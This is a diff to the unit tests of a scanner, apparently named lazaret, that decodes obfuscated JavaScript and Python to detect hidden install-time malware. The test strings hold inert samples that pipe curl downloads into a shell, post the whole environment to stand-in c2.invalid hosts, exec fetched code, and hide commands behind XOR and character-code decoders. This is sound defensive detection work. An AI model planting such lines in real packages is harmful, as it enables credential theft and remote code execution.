@@ -13,9 +13,9 @@ payloads are placeholders, nothing is executed.
 import base64
 import unittest
 
-from lazaret.scanner import core
+from lazaret.scanner import core, engine
 
-NOTE = core._DV_NOTE
+NOTE = engine.pack_value("_DV_NOTE")
 RUN = "runs code it receives over the network"
 
 
@@ -48,7 +48,9 @@ class DecodedViewTests(unittest.TestCase):
         self.assertIn("require('axios')[['post']]('https://c2.invalid/a', { ...process.env })[['then']]", view)
         self.assertEqual(view.count("\n"), TAILWIND.count("\n"))            # lines stay the file's
         reasons, line = core.import_time_risk(TAILWIND, "js")
-        self.assertEqual((reasons, line), ([RUN + NOTE], 13))
+        # (read on the tree, the view's `[['post']]` is a send too: of the whole environment)
+        harvest = "reads credentials or the whole environment and sends data over the network"
+        self.assertEqual((reasons, line), ([harvest + NOTE, RUN + NOTE], 13))
         self.assertEqual(core.import_time_severity(reasons), "CRITICAL")
 
     def test_decode_calls_on_literals(self):
@@ -86,15 +88,65 @@ class DecodedViewTests(unittest.TestCase):
 
     def test_names_hidden_from_the_install_script_test(self):
         self.assertEqual(core.install_script_risk(METRICS),
-                         ["reads environment variables or credential files and sends data over the network" + NOTE])
+                         ["sends environment variables over the network (the whole environment)" + NOTE])
 
     def test_bounded(self):
         import time
-        big = "g('6f73')" + " " * core._DV_MAX_CHARS
+        big = "g('6f73')" + " " * engine.pack_value("_DV_MAX_CHARS")
         self.assertEqual(core.decoded_view(big), big)
         start = time.perf_counter()
         core.decoded_view(("atob('eA==') + " * 20_000) + "\nx = [" + "'a'," * 70_000 + "]\n")
         self.assertLess(time.perf_counter() - start, 5.0)
+
+
+class LiteralsReadByTheLexersTests(unittest.TestCase):
+    """Phase 2: in JavaScript and Python the decoded view reads string
+    literals as the runtime reads them (lex/value.rs): a literal partly
+    written in escapes, literals joined across lines, quote kinds and
+    comments, Python's adjacent literals. A text of no known language keeps
+    the patterns' reading (only literals wholly in \\x and \\u escapes)."""
+
+    PARTLY = "require('child_pro\\x63ess').execSync('cu\\x72l https://x.invalid/i.sh | sh');\n"
+
+    def test_a_literal_partly_written_in_escapes(self):
+        self.assertEqual(core.decoded_view(self.PARTLY, "js"),
+                         "require('child_process').execSync('curl https://x.invalid/i.sh | sh');\n")
+        self.assertEqual(core.decoded_view(self.PARTLY), self.PARTLY)
+        self.assertEqual(core.decoded_view("os.sys\\x74em('x')\n", "py"), "os.sys\\x74em('x')\n")  # (code)
+        self.assertEqual(core.decoded_view("os.system('cu\\x72l x')\n", "py"), "os.system('curl x')\n")
+
+    def test_the_install_script_test_reads_them(self):
+        self.assertEqual(core.install_script_risk(self.PARTLY, lang="js"), ["pipes a download into a shell" + NOTE])
+        self.assertEqual(core.install_script_risk(self.PARTLY), [])
+        cmd = 'node -e "%s"' % self.PARTLY.strip()          # (in sh's double quotes \\x is as written)
+        self.assertIn("pipes a download into a shell" + NOTE, core.hook_command_risk(cmd))
+
+    def test_literals_joined_across_lines_quotes_and_comments(self):
+        b64 = base64.b64encode(b"child_process").decode()
+        text = "const cp = require(atob('%s' +\n  /* part */ \"%s\"));\nmodule.exports = cp;\n" % (b64[:8], b64[8:])
+        view = core.decoded_view(text, "js")
+        self.assertEqual(view, "const cp = require('child_process');\n\nmodule.exports = cp;\n")
+        self.assertEqual(view.count("\n"), text.count("\n"))            # the lines after keep their numbers
+        self.assertEqual(core.decoded_view(text), text)
+
+    def test_python_adjacent_literals(self):
+        b64 = base64.b64encode(b"subprocess").decode()
+        text = "import base64\nm = __import__(base64.b64decode('%s'\n    '%s').decode())\n" % (b64[:6], b64[6:])
+        self.assertEqual(core.decoded_view(text, "py"), "import base64\nm = __import__('subprocess')\n\n")
+        # at the top level a line break ends the statement: nothing is joined
+        top = "import base64\nbase64.b64decode('%s')\n'%s'.decode()\n" % (b64[:6], b64[6:])
+        self.assertEqual(core.decoded_view(top, "py"), top)
+
+    def test_joins_alone_decode_nothing(self):
+        for text, lang in (("x = 'a' + 'b'\n", "js"), ("x = ('a'\n 'b')\n", "py")):
+            with self.subTest(text):
+                self.assertEqual(core.decoded_view(text, lang), text)
+
+    def test_what_binds_tighter_is_not_joined(self):
+        b64 = base64.b64encode(b"child_process").decode()
+        # `'…' + '…'.trim()`: the second literal is trim's, not the join's
+        text = "require(atob('%s' + '%s'.trim()))\n" % (b64[:8], b64[8:])
+        self.assertEqual(core.decoded_view(text, "js"), text)
 
 
 def xored(text, key, kind="base64"):
@@ -121,14 +173,13 @@ class XorDecoderTests(unittest.TestCase):
         self.assertIn("v0='sqlite3'", view)
         self.assertIn("v3='https://c2.ngrok-free.app/api'", view)
         self.assertEqual(view.count("\n"), ZUTILS.count("\n"))
-        self.assertEqual(core.install_script_risk(ZUTILS),
-                         ["contacts an address typical of data exfiltration (ngrok)" + NOTE])
-        self.assertEqual(core._dv_xor_decoders(ZUTILS), {"a": ("base64", b"utf8")})
+        # (0.1.8: the service the decoded address names is where data would
+        # go, not a sign on its own: this shape reads and sends nothing)
+        self.assertEqual(core.install_script_risk(ZUTILS), [])
 
     def test_hex_and_other_keys(self):
         text = ("const k = 'k3y!'; Buffer; x ^ y;\n"
                 + "\n".join(f"dec('{xored(w, b'k3y!', 'hex')}');" for w in ZUTILS_WORDS) + "\n")
-        self.assertEqual(core._dv_xor_decoders(text), {"dec": ("hex", b"k3y!")})
         view = core.decoded_view(text)
         self.assertIn("\n'sqlite3';\n'child_process';\n", view)
 
@@ -147,13 +198,15 @@ class XorDecoderTests(unittest.TestCase):
         # one call in ten may stay unread, not two
         nine = "Buffer x^y 'utf8' " + ",".join(f'a("{xored(w, b"utf8")}")' for w in ZUTILS_WORDS + ["abc", "def"])
         self.assertNotEqual(core.decoded_view(nine + ',a("x-y")'), nine + ',a("x-y")')
-        self.assertEqual(core._dv_xor_decoders(nine + ',a("x-y"),a("x-y")'), {})
+        self.assertEqual(core.decoded_view(nine + ',a("x-y"),a("x-y")'), nine + ',a("x-y"),a("x-y")')
 
     def test_the_first_256_keys_are_tried(self):
         calls = ",".join(f'a("{xored(w, b"utf8")}")' for w in ZUTILS_WORDS)
-        many = "".join(f"'k{i}';" for i in range(core._DV_XOR_MAX_KEYS - 1))
-        self.assertEqual(core._dv_xor_decoders("x^y " + many + "'utf8'; " + calls), {"a": ("base64", b"utf8")})
-        self.assertEqual(core._dv_xor_decoders("x^y " + many + "'k-last'; 'utf8'; " + calls), {})
+        many = "".join(f"'k{i}';" for i in range(engine.pack_value("_DV_XOR_MAX_KEYS") - 1))
+        tried = "Buffer x^y " + many + "'utf8'; " + calls
+        self.assertIn("'sqlite3'", core.decoded_view(tried))
+        past = "Buffer x^y " + many + "'k-last'; 'utf8'; " + calls
+        self.assertEqual(core.decoded_view(past), past)
 
     def test_bounded(self):
         import time
@@ -166,6 +219,135 @@ class XorDecoderTests(unittest.TestCase):
             self.assertLess(time.perf_counter() - start, 5.0, text[:30])
 
 
+def codes(text, f):
+    """The array literal of `text`'s character codes, each c at position i made f(c, i)."""
+    return "[" + ", ".join(str(f(ord(ch), i)) for i, ch in enumerate(text)) + "]"
+
+
+def keyed(i, bias):
+    """A key that moves with the position (the shape @fnos/app's decoder had, other constants)."""
+    return (i + bias) * 29 + 11 & 0xff
+
+
+class CharCodeTests(unittest.TestCase):
+    """0.1.8: character codes read as text — literal ones, and what a file's
+    own decoder computes from them, whatever its key (inert rewrites; hosts
+    are .invalid)."""
+
+    def test_literal_character_codes(self):
+        cases = {
+            "String.fromCharCode(104, 116, 116, 112, 115)": "'https'",
+            "String.fromCharCode(...[0x63, 0x75, 0x72, 0x6c])": "'curl'",
+            "String.fromCharCode.apply(null, [101, 118, 97, 108])": "'eval'",
+            "''.join(map(chr, [111, 115]))": "'os'",
+            "''.join(chr(c) for c in [115, 104])": "'sh'",
+            "''.join([chr(x) for x in (98, 97, 115, 104)])": "'bash'",
+            "bytes([99, 117, 114, 108]).decode()": "'curl'",
+            "bytearray([119, 103, 101, 116]).decode('utf-8')": "'wget'",
+        }
+        for src, want in cases.items():
+            with self.subTest(src):
+                self.assertEqual(core.decoded_view("x = " + src + ";\n"), "x = " + want + ";\n")
+        for src in ("String.fromCharCode(10)", "String.fromCharCode(65 + i)", "bytes([0, 1]).decode()",
+                    "String.fromCharCode(0x110000)", "''.join(map(chr, []))"):
+            with self.subTest(src):
+                self.assertEqual(core.decoded_view("x = " + src + ";\n"), "x = " + src + ";\n")
+
+    def test_a_decoder_with_a_key_that_moves(self):
+        text = ("function unpack(buffer, bias) {\n  var out = '';\n"
+                "  for (var pos = 0; pos < buffer.length; pos++) {\n"
+                "    out += String.fromCharCode(buffer[pos] ^ ((pos + bias) * 29 + 11 & 0xff));\n  }\n  return out;\n}\n"
+                "var _dir = " + codes("worker", lambda c, i: c ^ keyed(i, 4)) + ";\n"
+                "var p = path.join(__dirname, unpack(_dir, 4), unpack(" + codes("run.js", lambda c, i: c ^ keyed(i, 9))
+                + ", 9));\nspawn(process.execPath, [p], { detached: true, stdio: 'ignore' }).unref();\n")
+        view = core.decoded_view(text)
+        self.assertIn("var p = path.join(__dirname, 'worker', 'run.js');", view)
+        self.assertEqual(view.count("\n"), text.count("\n"))
+        self.assertEqual(core.spawned_scripts(text), [("dir", "worker/run.js")])
+
+    def test_the_forms_of_a_decoder(self):
+        cases = [
+            # an arrow over .map, the key and the position
+            ("const d = (a, k) => a.map((c, i) => String.fromCharCode(c - k - i)).join('');\n",
+             lambda w: "d(" + codes(w, lambda c, i: c + 5 + i) + ", 5)"),
+            # a function's spread of .map
+            ("function d(a) { return String.fromCharCode(...a.map(c => c ^ 0x5a)); }\n",
+             lambda w: "d(" + codes(w, lambda c, i: c ^ 0x5a) + ")"),
+            # map with a function callback
+            ("var d = function (a) { return a.map(function (c) { return String.fromCharCode(c + 3); }).join(''); };\n",
+             lambda w: "d(" + codes(w, lambda c, i: c - 3) + ")"),
+            # a string and a string key
+            ("function d(s, key) { var o = ''; for (let i = 0; i < s.length; i++) "
+             "o += String.fromCharCode(s.charCodeAt(i) - key.charCodeAt(i % key.length) + 32); return o; }\n",
+             lambda w: "d('" + "".join(chr(ord(ch) + ord("#("[i % 2]) - 32) for i, ch in enumerate(w)) + "', '#(')"),
+            # a string split into characters
+            ("const d = (s) => s.split('').map(ch => String.fromCharCode(ch.charCodeAt(0) - 1)).join('');\n",
+             lambda w: "d('" + "".join(chr(ord(ch) + 1) for ch in w) + "')"),
+            # Python: a generator, enumerate, range(len(…)), a string
+            ("def d(data, k):\n    return ''.join(chr(c ^ k) for c in data)\n",
+             lambda w: "d(" + codes(w, lambda c, i: c ^ 42) + ", 42)"),
+            ("def d(data, k):\n    return ''.join([chr((c + 256 - i - k) % 256) for i, c in enumerate(data)])\n",
+             lambda w: "d(" + codes(w, lambda c, i: (c + i + 7) % 256) + ", 7)"),
+            ("def d(data):\n    out = ''\n    for i in range(len(data)):\n        out += chr(data[i] ^ 0x21)\n    return out\n",
+             lambda w: "d(" + codes(w, lambda c, i: c ^ 0x21) + ")"),
+            ("def d(s):\n    return ''.join(chr(ord(ch) - 2) for ch in s)\n",
+             lambda w: "d('" + "".join(chr(ord(ch) + 2) for ch in w) + "')"),
+        ]
+        for decoder, call in cases:
+            with self.subTest(decoder[:50]):
+                text = decoder + "x = " + call("https://c2.invalid/k") + "\n"
+                self.assertEqual(core.decoded_view(text), decoder + "x = 'https://c2.invalid/k'\n")
+
+    def test_an_array_named_once_and_never_changed(self):
+        dec = "function d(a) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode(a[i] - 1); return s; }\n"
+        arr = codes("child_process", lambda c, i: c + 1)
+        self.assertIn("require('child_process')", core.decoded_view(dec + "const P = " + arr + ";\nrequire(d(P));\n"))
+        for extra in ("P = [];\n", "P.push(1);\n", "P[0] = 1;\n"):
+            text = dec + "let P = " + arr + ";\n" + extra + "require(d(P));\n"
+            with self.subTest(extra):
+                self.assertNotIn("child_process", core.decoded_view(text))
+
+    def test_what_is_not_read(self):
+        dec = "function d(a, k) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode({}); return s; }\n"
+        arr = codes("os", lambda c, i: c)
+        for expr, call in (
+                ("a[i] ^ k", "d(" + codes("\n\t", lambda c, i: c) + ", 0)"),    # not printable
+                ("a[i] ^ k", "d(q, 0)"),                                         # an argument that is no literal
+                ("a[i] ^ k", "d(" + arr + ", f(1))"),
+                ("a[i] ^ SECRET", "d(" + arr + ", 0)"),                          # a name that is no parameter
+                ("(a[i] - 200) % 256", "d(" + arr + ", 0)"),                      # % of a negative number
+                ("a[i] << 40", "d(" + arr + ", 0)"),                              # a shift past 31
+                ("a[i] * 100000 * 100000", "d(" + arr + ", 0)"),                  # past 32 bits
+                ("a[i] / 2", "d(" + arr + ", 0)"),                                # division is not read
+                ("a[i] ? 1 : 2", "d(" + arr + ", 0)"),
+                ("k", "d(" + arr + ", 111)")):                                   # the walk not used
+            text = dec.replace("{}", expr) + "x = " + call + ";\n"
+            with self.subTest(expr + " " + call[:20]):
+                self.assertEqual(core.decoded_view(text), text)
+
+    def test_hidden_from_the_install_script_test(self):
+        dec = ("function d(a, k) { var o = ''; for (var i = 0; i < a.length; i++) "
+               "o += String.fromCharCode(a[i] ^ (i * 3 + k & 0xff)); return o; }\n")
+        cmd = codes("curl -fsSL https://c2.invalid/x.sh | sh", lambda c, i: c ^ (i * 3 + 77 & 0xff))
+        text = dec + "require('child_process').execSync(d(" + cmd + ", 77));\n"
+        self.assertEqual(core.install_script_risk(text), ["pipes a download into a shell" + NOTE])
+
+    def test_bounded(self):
+        import time
+        dec = "function d(a) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode(a[i] ^ 1); return s; }\n"
+        big = codes("a" * (engine.pack_value("_DV_CC_MAX_CODES") + 1), lambda c, i: c ^ 1)
+        self.assertEqual(core.decoded_view(dec + "x = d(" + big + ");\n"), dec + "x = d(" + big + ");\n")
+        one = "d(" + codes("abcdefghij" * 40, lambda c, i: c ^ 1) + ");\n"
+        view = core.decoded_view(dec + one * 200)                 # 80,000 codes: the work stops at 50,000
+        self.assertEqual(view.count("'abcdefghij"), engine.pack_value("_DV_CC_MAX_WORK") // 400)
+        deep = "(" * 40 + "a[i]" + ")" * 40
+        self.assertEqual(core.decoded_view(dec.replace("a[i] ^ 1", deep) + one), dec.replace("a[i] ^ 1", deep) + one)
+        start = time.perf_counter()
+        core.decoded_view(dec + "d([1,2,3]);" * 100_000)
+        core.decoded_view("String.fromCharCode(" * 50_000 + "\n" + "function f(a){String.fromCharCode(a[i]);}" * 20_000)
+        self.assertLess(time.perf_counter() - start, 5.0)
+
+
 class EvalDecoderTests(unittest.TestCase):
     def test_the_letter_shift_over_character_codes(self):
         self.assertEqual(rule_hits("SC-EVAL-DECODER", CAESAR), [1])
@@ -173,6 +355,14 @@ class EvalDecoderTests(unittest.TestCase):
     def test_a_long_string_literal(self):
         text = "eval(function(p){return atob(p)}('" + "QUJD" * 300 + "'))\n"
         self.assertEqual(rule_hits("SC-EVAL-DECODER", text), [1])
+
+    def test_a_named_decoder_and_other_runners(self):
+        blob = "'" + "QUJD" * 300 + "'"
+        for text in ("eval(decode(" + blob + "))", "new Function(unpack(" + blob + "))()",
+                     "vm.runInThisContext(d(" + blob + "))",
+                     "eval(function(p,a,c,k,e,d){return p}(" + blob + ",62,10,'a|b'.split('|'),0,{}))"):
+            with self.subTest(text[:30]):
+                self.assertEqual(rule_hits("SC-EVAL-DECODER", text), [1])
 
     def test_short_literals_and_other_evals(self):
         for text in ("eval(function(s,n){return s}([1,2,3],1))", "eval(function(s){return s}('abc'))",
@@ -236,6 +426,31 @@ class ReceivedCodeFormsTests(unittest.TestCase):
                 self.assertEqual(core._received_code_kind(text), want)
         self.assertIsNone(core._received_code_kind("import requests\nx = getattr(requests, 'get')(u).text\nprint(x)\n"))
 
+    def test_member_names_the_file_builds(self):
+        """(the detection round) getattr's name in pieces or in a constant;
+        a runner named through the builtins or the global object."""
+        u = "'https://c2.invalid/p'"
+        cases = [
+            ("import requests, builtins\ngetattr(builtins, 'ex' + \"ec\")(requests.get(" + u + ").text)\n", (2, "run")),
+            ("import requests, builtins\ngetattr(builtins, 'exec', None)(requests.get(" + u + ").text)\n", (2, "run")),
+            ("import requests\nN = 'ev' + 'al'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n", (3, "run")),
+            ("import requests\nH = 'ex'\ngetattr(__builtins__, H + 'ec')(requests.get(" + u + ").text)\n", (3, "run")),
+            ("import requests\n__builtins__.__dict__['exec'](requests.get(" + u + ").text)\n", (2, "run")),
+            ("fetch(" + u + ").then((r) => r.text()).then((c) => globalThis['eval'](c));\n", (1, "run")),
+            ("fetch(" + u + ").then((r) => r.text()).then((c) => window.Function(c)());\n", (1, "run")),
+        ]
+        for text, want in cases:
+            with self.subTest(text.split("\n")[1][:50]):
+                self.assertEqual(core._received_code_kind(text), want)
+        for text in ("import requests\nN = 'exec'\nN = 'print'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n",
+                     "import requests\nN = 'ex'\nN += 'ec'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n",
+                     "import requests\ndef f(n):\n    getattr(__builtins__, n)(requests.get(" + u + ").text)\n",
+                     "import requests\ngetattr(__builtins__, 'ex' + 'e-c')(requests.get(" + u + ").text)\n",
+                     "import requests, builtins\nbuiltins.execute(requests.get(" + u + ").text)\n",
+                     "fetch(" + u + ").then((r) => r.text()).then((c) => myglobal.eval(c));\n"):
+            with self.subTest(text.split("\n")[1][:50]):
+                self.assertIsNone(core._received_code_kind(text))
+
     def test_a_runner_handed_to_a_call(self):
         """p.then(eval), res.on('data', eval): the runner is called with what the call hands it."""
         cases = [
@@ -251,7 +466,7 @@ class ReceivedCodeFormsTests(unittest.TestCase):
             with self.subTest(quiet):
                 self.assertIsNone(core._received_code_kind(quiet))
         # (0, eval)(x) is an indirect eval, not a runner handed to a call
-        self.assertEqual(core._dl_callbacks("(0, eval)(x);\np.then(eval);\n"), "(0, eval)(x);\np.then((_v)=>eval(_v));\n")
+        self.assertIsNone(core._received_code_kind("(0, eval)(x);\n"))
 
 
 class WrittenAndRunTests(unittest.TestCase):
